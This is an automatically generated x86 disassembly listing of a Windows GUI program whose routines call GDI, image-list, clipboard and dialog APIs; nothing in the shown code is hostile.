push ebx
cmp [ eax + 0x2a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
sub_41d680
push ebx
mov ebx eax
test [ ebx + 0x8 ] 0x2
je r-xdata
pop ebx
retn
and [ ebx + 0x8 ] 0xfd
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
sub_41d6a0
push ebx
mov ebx eax
test [ ebx + 0x8 ] 0x4
je r-xdata
pop ebx
retn
and [ ebx + 0x8 ] 0xfb
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
sub_41d6c0
push ebx
mov ebx eax
test [ ebx + 0x8 ] 0x8
je r-xdata
pop ebx
retn
and [ ebx + 0x8 ] 0xf7
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
sub_41d6e0
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b340
call sub_4039cc
pop ebx
retn
sub_41d6f8
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b340
call sub_4039cc
pop ebx
retn
sub_41d71c
mov eax [ rw-data ]
call sub_41d6f8
retn
sub_41d772
jmp sub_403994
sub_41d779
pop ecx
pop ebp
retn
sub_41d818
jmp sub_403994
sub_41d81f
pop ebx
mov esp ebp
pop ebp
retn
sub_41d8f1
jmp sub_403994
sub_41d982
jmp sub_403994
sub_41d989
mov eax [ ebp - 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41d9b4
dec ecx
imul edx
add eax ecx
not ecx
and eax ecx
test eax eax
jns r-xdata
sar eax 0x3
retn
add eax 0x7
sub_41da9b
jmp sub_403994
sub_41dc48
jmp sub_403994
sub_41dc4f
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x28
sub_41de61
jmp sub_403994
sub_41de68
lea eax [ ebp - 0x408 ]
push eax
call CreatePalette
pop ebx
mov esp ebp
pop ebp
retn
sub_41df02
jmp sub_403994
sub_41e0de
jmp sub_403994
sub_41e198
jmp sub_403994
sub_41e19f
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e1bf
mov eax [ ebp - 0x10 ]
push eax
push 0x0
call ReleaseDC
retn
sub_41e1b8
jmp sub_403994
sub_41e1bf
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_41e34d
jmp sub_403994
sub_41e518
jmp sub_403994
sub_41e51f
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e542
mov eax [ ebp - 0x40 ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x2c ]
call sub_4026dc
retn
sub_41e53b
jmp sub_403994
sub_41e542
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e562
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x10 ]
call sub_4026dc
retn
sub_41e55b
jmp sub_403994
sub_41e562
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_41e6b4
push 0x0
call sub_41e650
retn
sub_41e759
jmp sub_403994
sub_41e760
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_41e76c
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
push 0x0
call sub_41e6bc
pop ebx
pop ebp
retn 0x4
sub_41e780
retn
sub_41e784
test eax eax
jne r-xdata
retn
call sub_41e780
sub_41e957
jmp sub_403994
sub_41e97e
jmp sub_403994
sub_41e985
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41e9c4
push ebx
mov [ eax + 0x20 ] 0x1
cmp [ eax + 0x12 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x14 ]
call [ ebx + 0x10 ]
sub_41eb91
mov eax [ ebp - 0xc ]
call sub_403258
retn
sub_41eb9a
jmp sub_403994
j_sub_41eb91
jmp sub_41eb91
sub_41eba1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_403258
retn
sub_41ebb7
jmp sub_403994
sub_41ebc8
xor eax eax
retn
sub_41ebcc
mov al [ eax + 0x21 ]
retn
sub_41ec18
jmp sub_403994
sub_41ec1f
pop esi
pop ecx
pop ebp
retn
sub_41ec4c
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x54 ]
pop esi
retn
sub_41eca3
jmp sub_403994
sub_41ecaa
pop esi
pop ecx
pop ebp
retn
sub_41ecb0
retn
sub_41ecb4
cmp dl [ eax + 0x21 ]
je r-xdata
retn
mov [ eax + 0x21 ] dl
mov edx eax
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_41ecc4
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x58 ]
pop esi
retn
sub_41ede2
jmp sub_403994
sub_41ee0a
jmp sub_403994
sub_41ee11
mov esp ebp
pop ebp
retn
sub_41ee88
jmp sub_403994
sub_41ef90
jmp sub_403994
sub_41f07b
jmp sub_403994
sub_41f088
inc [ eax + 0x4 ]
retn
sub_41f203
jmp sub_403994
sub_41f5b4
jmp sub_403994
sub_41f7fe
jmp sub_403994
sub_41f828
jmp sub_403994
sub_41f82f
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f851
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
retn
sub_41f84a
jmp sub_403994
sub_41f85b
jmp sub_4036e0
sub_41f8aa
jmp sub_403994
sub_41fad7
jmp sub_403994
sub_41fb1f
jmp sub_403994
sub_41fc8c
jmp sub_403994
sub_41fd53
jmp sub_4036e0
sub_41fda8
mov [ eax + 0x31 ] 0x0
call sub_41e9c4
retn
sub_41fff9
jmp sub_403994
sub_420064
jmp sub_403994
sub_42006b
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4200dc
mov eax [ eax + 0x28 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x14 ] 0x0
jne r-xdata
cmp [ eax + 0x6c ] 0x0
je r-xdata
mov al 0x1
retn
sub_420190
mov ecx eax
mov eax [ ecx + 0x28 ]
mov eax [ eax + 0x20 ]
cdq
xor eax edx
sub eax edx
retn
sub_4201a0
push ebx
mov ebx eax
mov eax ebx
call sub_420438
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0xc ]
pop ebx
retn
sub_4201b4
mov eax [ eax + 0x28 ]
add eax 0x18
cmp [ eax + 0x10 ] 0x1
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x12 ] 0x1
je r-xdata
mov al 0x1
retn
sub_4201d0
push ebx
mov ebx eax
mov eax ebx
call sub_420498
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x10 ]
pop ebx
retn
sub_42022c
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x1c ]
retn
sub_42033b
jmp sub_403994
sub_420402
jmp sub_4036e0
sub_42067f
jmp sub_4036e0
sub_4206df
jmp sub_403994
sub_4206e6
mov eax [ ebp - 0x4 ]
mov [ eax + 0x32 ] 0x0
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0xc
sub_420ac7
jmp sub_403994
sub_420af3
jmp sub_403994
sub_420b5a
jmp sub_4036e0
sub_420b8b
jmp sub_403994
sub_420c10
jmp sub_4036e0
sub_420c15
mov eax [ ebp - 0x38 ]
call sub_403258
call sub_4039f4
call sub_403a48
sub_420c27
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420c44
mov eax [ ebp - 0x18 ]
call sub_4026dc
retn
sub_420c3d
jmp sub_403994
sub_420d93
jmp sub_4036e0
sub_42105f
jmp sub_4036e0
sub_4210f0
mov cl 0x1
call sub_4210f8
retn
sub_4213ad
add [ eax ] al
add [ ebx ] dh
leave
call sub_4210f8
retn
sub_421432
jmp sub_4036e0
sub_421437
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
push eax
call DeleteObject
call sub_4039f4
call sub_403a48
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_421488
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
pop ebx
retn
push eax
call DestroyIcon
sub_4215c1
add [ eax ] al
add [ ebx + 0x78832840 ] cl
or [ eax ] al
jne r-xdata
xor eax eax
retn
cmp [ eax + 0xc ] 0x0
je r-xdata
mov al 0x1
retn
sub_4215f0
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x14 ]
test eax eax
jne r-xdata
retn
push 0xc
call GetSystemMetrics
sub_421604
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x10 ]
test eax eax
jne r-xdata
retn
push 0xb
call GetSystemMetrics
sub_42171d
jmp sub_4036e0
sub_4217d2
jmp sub_4036e0
sub_42183c
jmp sub_4036e0
sub_421870
push ebx
mov ebx eax
xor ecx ecx
mov eax ebx
call sub_4217fc
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop ebx
retn
sub_421888
mov ecx [ eax + 0x28 ]
cmp [ ecx + 0x8 ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_41d6e0
retn
mov [ eax + 0x30 ] edx
retn
sub_4218a0
retn
sub_4218a4
mov ecx [ eax + 0x28 ]
cmp [ ecx + 0x8 ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_41d6e0
retn
mov [ eax + 0x2c ] edx
retn
sub_4218e4
push ebp
mov ebp esp
mov eax [ rw-data ]
call sub_41d6e0
pop ebp
retn 0x4
sub_4218f8
push ebp
mov ebp esp
mov eax [ rw-data ]
call sub_41d6e0
pop ebp
retn 0x4
sub_421ab8
add eax 0x8
push eax
call EnterCriticalSection
retn
sub_421ac4
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_421b71
jmp sub_403994
sub_421b78
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_421c63
jmp sub_4036e0
sub_421ccf
jmp sub_403994
sub_421dfd
jmp sub_403994
sub_421e04
pop ebp
retn
sub_421f04
cmp edx eax
jg r-xdata
retn
mov eax edx
sub_421f39
jmp sub_403994
sub_421f40
pop ebp
retn
sub_421f44
sub [ rw-data ] 0x1
retn
sub_42218c
mov edx [ eax + 0x4 ]
mov ecx [ edx + 0x8 ]
dec ecx
mov eax edx
mov edx ecx
call sub_4137ac
retn
sub_4221c0
mov eax [ eax + 0x4 ]
call sub_413650
retn
sub_4221f1
jmp sub_403994
sub_4221f8
pop ebp
retn
sub_4221fc
sub [ rw-data ] 0x1
retn
ImageList_Create
jmp [ ImageList_Create@IAT ]
ImageList_Destroy
jmp [ ImageList_Destroy@IAT ]
ImageList_GetImageCount
jmp [ ImageList_GetImageCount@IAT ]
ImageList_Add
jmp [ ImageList_Add@IAT ]
ImageList_ReplaceIcon
jmp [ __import_lookup_table_12(comctl32:ImageList_ReplaceIcon) ]
ImageList_SetBkColor
jmp [ __import_lookup_table_12(comctl32:ImageList_SetBkColor) ]
ImageList_GetBkColor
jmp [ ImageList_GetBkColor@IAT ]
ImageList_Remove
jmp [ ImageList_Remove@IAT ]
ImageList_BeginDrag
jmp [ __import_lookup_table_12(comctl32:ImageList_BeginDrag) ]
ImageList_EndDrag
jmp [ __import_lookup_table_12(comctl32:ImageList_EndDrag) ]
ImageList_DragEnter
jmp [ __import_lookup_table_12(comctl32:ImageList_DragEnter) ]
ImageList_DragLeave
jmp [ __import_lookup_table_12(comctl32:ImageList_DragLeave) ]
ImageList_DragMove
jmp [ __import_lookup_table_12(comctl32:ImageList_DragMove) ]
ImageList_DragShowNolock
jmp [ ImageList_DragShowNolock@IAT ]
ImageList_GetDragImage
jmp [ ImageList_GetDragImage@IAT ]
ImageList_Read
jmp [ ImageList_Read@IAT ]
ImageList_Write
jmp [ ImageList_Write@IAT ]
ImageList_GetIconSize
jmp [ ImageList_GetIconSize@IAT ]
ImageList_SetIconSize
jmp [ __import_lookup_table_12(comctl32:ImageList_SetIconSize) ]
sub_4222e5
jmp sub_403994
sub_4222ec
pop ebp
retn
sub_4222f0
sub [ rw-data ] 0x1
retn
sub_4223b7
jmp sub_403994
sub_4223be
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4229d4
push r-xdata
call GetModuleHandleA
mov [ rw-data ] eax
mov [ rw-data ] sub_4223e0
mov [ rw-data ] sub_4224f8
mov [ rw-data ] sub_422468
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] sub_4226fc
mov [ rw-data ] sub_4227d0
mov [ rw-data ] sub_4228a4
retn
sub_422a65
jmp sub_403994
sub_422a6c
pop ebp
retn
sub_422a70
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_4229d4
sub_422aa5
jmp sub_403994
sub_422aac
pop ebp
retn
sub_422ab0
sub [ rw-data ] 0x1
retn
sub_422ef2
jmp sub_403994
sub_422ef9
mov eax ebx
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_423109
jmp sub_403994
sub_423110
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4232c5
jmp sub_403994
sub_42332a
jmp sub_403994
sub_423331
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42341d
jmp sub_403994
sub_423424
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_423634
lea eax [ ebp - 0x30 ]
call sub_403f90
lea eax [ ebp - 0x20 ]
call sub_403f90
retn
sub_423645
jmp sub_403994
j_sub_423634
jmp sub_423634
sub_42364c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_423747
jmp sub_403994
sub_42374e
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42384b
jmp sub_403994
sub_423852
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4238b2
lea eax [ ebp - 0x4 ]
call sub_4055cc
retn
sub_4238bb
jmp sub_403994
j_sub_4238b2
jmp sub_4238b2
sub_4238c2
pop ebx
pop ecx
pop ebp
retn
sub_42395d
jmp sub_403994
sub_423964
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_423970
mov eax [ eax + 0x20 ]
retn
sub_423a9f
jmp sub_403994
sub_423aa6
pop ebp
retn
sub_423aa8
sub [ rw-data ] 0x1
retn
sub_423ad5
jmp sub_403994
sub_423adc
pop ebp
retn
sub_423ae0
sub [ rw-data ] 0x1
retn
sub_423b19
jmp sub_403994
sub_423b20
pop ebp
retn
sub_423b24
sub [ rw-data ] 0x1
retn
sub_423e31
jmp sub_403994
sub_423e38
pop ebp
retn
sub_423e3c
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_423b88
sub_423f1c
retn
sub_423f90
add eax 0x4
push eax
call EnterCriticalSection
retn
sub_423f9c
add eax 0x4
push eax
call LeaveCriticalSection
retn
sub_423fa8
mov edx [ eax ]
call [ edx ]
retn
sub_423fb0
mov edx [ eax ]
call [ edx + 0x4 ]
retn
sub_423fdd
jmp sub_403994
sub_423fe4
pop ebp
retn
sub_423fe8
sub [ rw-data ] 0x1
retn
sub_4241a7
jmp sub_403994
sub_4241ae
pop ebp
retn
sub_424563
jmp sub_403994
sub_42456a
mov al [ ebp - 0x1 ]
pop ebx
pop ecx
pop ebp
retn
sub_424984
jmp sub_403994
sub_42498b
pop ebp
retn
sub_424990
sub [ rw-data ] 0x1
jae r-xdata
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_423f20
mov [ rw-data ] eax
sub_4249d1
jmp sub_403994
sub_4249d8
pop ebp
retn
sub_4249dc
sub [ rw-data ] 0x1
retn
sub_424a09
jmp sub_403994
sub_424a10
pop ebp
retn
sub_424a14
sub [ rw-data ] 0x1
retn
sub_424a41
jmp sub_403994
sub_424a48
pop ebp
retn
sub_424a4c
sub [ rw-data ] 0x1
retn
sub_424a79
jmp sub_403994
sub_424a80
pop ebp
retn
sub_424a84
sub [ rw-data ] 0x1
retn
sub_424ab1
jmp sub_403994
sub_424ab8
pop ebp
retn
sub_424abc
sub [ rw-data ] 0x1
retn
sub_424ae9
jmp sub_403994
sub_424af0
pop ebp
retn
sub_424af4
sub [ rw-data ] 0x1
retn
sub_424b21
jmp sub_403994
sub_424b28
pop ebp
retn
sub_424b2c
sub [ rw-data ] 0x1
retn
FindTextA
jmp [ __import_lookup_table_13(comdlg32:FindTextA) ]
sub_424b61
jmp sub_403994
sub_424b68
pop ebp
retn
sub_424b6c
sub [ rw-data ] 0x1
retn
sub_424b99
jmp sub_403994
sub_424ba0
pop ebp
retn
sub_424ba4
sub [ rw-data ] 0x1
retn
sub_42515e
jmp sub_4036e0
sub_425163
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_458560
call sub_403a48
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_425180
mov ecx [ eax ]
call [ ecx - 0x14 ]
retn
sub_425188
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
mov si 0xffef
call sub_403454
pop esi
retn
sub_4251a0
push ebx
push esi
mov ebx edx
mov si 0xffee
call sub_403454
xor eax eax
mov [ ebx + 0xc ] eax
pop esi
pop ebx
retn
sub_4251b8
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
xor eax eax
mov [ esi + 0x3c ] eax
pop esi
retn
sub_425261
jmp sub_403994
sub_42528f
jmp sub_403994
sub_425296
mov eax [ ebp - 0xc ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4252a0
push ebx
cmp [ eax + 0x4a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_4252b4
push ebx
cmp [ eax + 0x52 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
sub_425484
call sub_403258
retn
sub_42580c
push ebx
cmp [ eax + 0x72 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x74 ]
call [ ebx + 0x70 ]
sub_425820
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
lea edx [ ebx + 0xac ]
mov ecx 0x100
call sub_404200
pop esi
pop ebx
retn
sub_42583c
push ebx
add esp 0xfffffff8
mov ebx eax
mov edx esp
mov eax ebx
call sub_425854
mov eax [ esp ]
pop ecx
pop edx
pop ebx
retn
sub_425888
push ebx
add esp 0xfffffff8
mov ebx eax
mov edx esp
mov eax ebx
call sub_425854
mov eax [ esp + 0x4 ]
pop ecx
pop edx
pop ebx
retn
sub_425982
add [ eax ] al
push ebx
cmp [ eax + 0x7a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x7c ]
call [ ebx + 0x78 ]
sub_425c06
jmp sub_403994
sub_425c0d
pop ebp
retn
sub_425e3a
inc ebx
add ah ah
0x42
sub_425fb6
inc ebx
add ah ah
0x42
sub_426379
jmp [ edx ]
sub_427143
push 0x42
add [ edx + eax ] ah
add bh bh
int3
sub_427706
jmp sub_4036e0
sub_4277bf
jmp sub_403994
sub_4277c6
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4277cc
cmp dl [ eax + 0x40 ]
je r-xdata
retn
mov [ eax + 0x40 ] dl
call sub_427740
sub_4277dc
cmp edx [ eax + 0x30 ]
je r-xdata
retn
mov [ eax + 0x30 ] edx
call sub_427740
sub_4277ec
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov [ eax + 0x38 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x3c ] edx
call sub_427740
pop ebp
retn 0x8
sub_427804
push ebx
cmp [ eax + 0x3a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_427aa1
jmp sub_4036e0
sub_427c14
retn
sub_427da1
jmp sub_403994
sub_427e24
push ebx
mov ebx eax
mov eax ebx
call sub_43aafc
mov eax ebx
call sub_427c18
pop ebx
retn
sub_427e38
push ebx
mov ebx eax
mov [ ebx + 0x220 ] 0x1
mov eax ebx
call sub_43b21c
mov [ ebx + 0x220 ] 0x0
mov eax ebx
call sub_427f60
pop ebx
retn
sub_427f50
push esi
mov esi eax
mov eax [ esi + 0x214 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_428029
jmp sub_403994
sub_428030
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_428078
push ebx
mov ebx eax
mov eax ebx
call sub_43e784
mov eax ebx
call sub_427c18
pop ebx
retn
sub_42808c
push ebx
mov ebx eax
mov eax ebx
call sub_42cfbc
mov eax ebx
call sub_427c18
pop ebx
retn
sub_4280a0
mov al 0x1
retn
sub_4280a4
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_428160
mov eax [ eax + 0x40 ]
retn
sub_428164
mov eax [ eax + 0x44 ]
retn
sub_42821c
push esi
mov esi eax
mov eax esi
call sub_43e5a4
mov dl [ esi + 0x5f ]
mov eax [ esi + 0x220 ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
pop esi
retn
sub_428258
push ebx
mov ebx eax
mov eax ebx
call sub_43e6bc
mov dl [ ebx + 0x57 ]
mov eax [ ebx + 0x220 ]
call sub_438960
pop ebx
retn
sub_4283d8
mov [ eax + 0x228 ] edx
mov dl [ eax + 0x224 ]
call sub_4282cc
retn
sub_428472
jmp sub_403994
sub_428479
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_428827
pop ebp
retn
sub_42882c
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax r-xdata
call sub_403d18
mov eax [ r-xdata ]
call sub_412fe8
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_413034
sub_428881
jmp sub_403994
sub_428888
pop ebp
retn
sub_42888c
sub [ rw-data ] 0x1
retn
sub_4288c5
jmp sub_403994
sub_4288cc
pop ebp
retn
sub_4288d0
sub [ rw-data ] 0x1
jae r-xdata
retn
push r-xdata
call RegisterClipboardFormatA
mov [ rw-data ] ax
push r-xdata
call RegisterClipboardFormatA
mov [ rw-data ] ax
xor eax eax
mov [ rw-data ] eax
sub_42894c
retn
sub_42894d
jmp sub_403994
j_sub_42894c
jmp sub_42894c
sub_428954
pop ebp
retn
sub_428958
sub [ rw-data ] 0x1
retn
sub_428960
push ebx
push esi
mov bl 0xb
mov esi rw-data
mov eax [ esi ]
call sub_403258
add esi 0x4
dec bl
jne r-xdata
pop esi
pop ebx
retn
sub_428a24
jmp sub_403994
sub_428a2b
pop ebp
retn
sub_428a7d
jmp sub_403994
sub_428a84
pop ebp
retn
sub_428a88
sub [ rw-data ] 0x1
retn
sub_428ae4
jmp sub_403994
sub_428aeb
pop ebp
retn
sub_428af0
sub [ rw-data ] 0x1
retn
sub_428b4c
jmp sub_403994
sub_428b53
pop ebp
retn
sub_428b58
sub [ rw-data ] 0x1
retn
sub_428bb9
jmp sub_403994
sub_428bc0
pop ebp
retn
sub_428bc4
sub [ rw-data ] 0x1
retn
sub_428c10
jmp sub_403994
sub_428c17
pop ebp
retn
sub_428c1c
sub [ rw-data ] 0x1
retn
sub_428c49
jmp sub_403994
sub_428c50
pop ebp
retn
sub_428c54
sub [ rw-data ] 0x1
retn
sub_428cfc
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
retn
mov eax r-xdata
call sub_40bad4
mov [ rw-data ] eax
sub_428d31
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push ebx
mov eax ecx
mov ecx [ ebp + 0x8 ]
xchg edx eax
mov ebx [ eax ]
call [ ebx + 0xc ]
pop ebx
pop ebp
retn 0x4
sub_428d48
push ebp
mov ebp esp
push ebx
mov eax ecx
mov ecx [ ebp + 0x8 ]
xchg edx eax
mov ebx [ eax ]
call [ ebx + 0x10 ]
pop ebx
pop ebp
retn 0x4
sub_428dcb
jmp sub_403994
sub_428dd2
pop ebp
retn
sub_428dd4
sub [ rw-data ] 0x1
retn
sub_428e43
jmp [ edi ]
sub_4290e4
cmp [ eax + 0x5 ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x6 ] 0x0
je r-xdata
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_4290fc
push ebx
cmp [ eax + 0x6a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x6c ]
call [ ebx + 0x68 ]
sub_429140
push ebx
mov ebx eax
mov eax ebx
call sub_429868
mov eax ebx
mov edx [ eax ]
call [ edx ]
pop ebx
retn
sub_429857
jmp sub_403994
sub_429868
push ebx
mov ebx eax
cmp [ ebx + 0x6 ] 0x0
je r-xdata
call sub_424914
mov [ ebx + 0x6 ] al
pop ebx
retn
mov eax ebx
call sub_429110
sub_4298bf
jmp sub_403994
sub_4298c6
pop ebp
retn
sub_4298c8
sub [ rw-data ] 0x1
retn
sub_4299a6
inc ebx
add ah ah
0x42
sub_42c85c
mov dl 0x1
test eax eax
je r-xdata
xor edx edx
cmp [ eax + 0x7c ] 0x0
jne r-xdata
mov eax edx
retn
mov eax [ eax + 0x30 ]
test eax eax
jne r-xdata
sub_42c984
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pushad
0x42
sub_42c994
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec esp
0x42
sub_42cb37
inc [ ecx ]
add [ eax ] al
add [ eax ] dh
add [ eax ] al
add [ ebx - 0x75 ] dl
fimul [ ebx - 0xa95172d ]
add [ eax ] al
and [ ebx + 0x24 ] 0xfffffffc
pop ebx
retn
sub_42cef2
jmp sub_403994
sub_42cef9
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42cf7e
jmp sub_403994
sub_42cf85
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42cf8c
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
call sub_43bae8
pop ebx
retn
sub_42cfa0
push ebx
mov ebx eax
mov eax ebx
call sub_43e840
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
call sub_43bae8
pop ebx
retn
sub_42cfbc
push ebx
mov ebx eax
mov eax ebx
call sub_43d814
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_42d068
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_438a40
pop esi
pop ebx
retn
sub_42d1d2
jmp sub_403994
sub_42d1d9
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42d2e8
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_43aafc
mov eax ebx
mov si 0xffc7
call sub_403454
pop esi
pop ebx
retn
sub_42d3d4
push esi
mov esi eax
cmp dl [ esi + 0x16c ]
je r-xdata
pop esi
retn
mov [ esi + 0x16c ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_42d3f0
push esi
cmp dl [ eax + 0x16d ]
je r-xdata
pop esi
retn
mov [ eax + 0x16d ] dl
mov si 0xffc7
call sub_403454
sub_42d40c
test [ eax + 0x50 ] 0x40
setne al
xor al 0x1
retn
sub_42d418
mov [ eax + 0x168 ] edx
test edx edx
je r-xdata
retn
xchg edx eax
call sub_41921c
sub_42d42c
push esi
mov esi eax
cmp dl [ esi + 0x170 ]
je r-xdata
pop esi
retn
mov [ esi + 0x170 ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_42d48c
push esi
mov esi eax
cmp dl [ esi + 0x16e ]
je r-xdata
pop esi
retn
mov [ esi + 0x16e ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_42d500
push ebx
push esi
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
mov si 0xffc7
call sub_403454
pop esi
pop ebx
retn
sub_42d51c
push esi
mov esi eax
mov eax esi
call sub_43a608
mov eax esi
mov si 0xffc7
call sub_403454
pop esi
retn
sub_42d5c1
jmp sub_403994
sub_42d5c8
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42d5d0
push ebx
mov ebx eax
mov eax ebx
call sub_43a76c
cmp [ ebx + 0x182 ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x184 ]
call [ ebx + 0x180 ]
sub_42d5f4
push ebx
mov ebx eax
mov eax ebx
call sub_43a784
cmp [ ebx + 0x17a ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x17c ]
call [ ebx + 0x178 ]
sub_42d6e0
cmp dl [ eax + 0x20f ]
je r-xdata
retn
mov [ eax + 0x20f ] dl
call sub_42dcec
sub_42d6f4
push ebx
mov ebx eax
cmp dl [ ebx + 0x20c ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x20c ] dl
mov eax ebx
call sub_42dcec
mov eax ebx
call sub_43c7c8
sub_42d718
cmp dl [ eax + 0x213 ]
je r-xdata
retn
mov [ eax + 0x213 ] dl
call sub_43c7c8
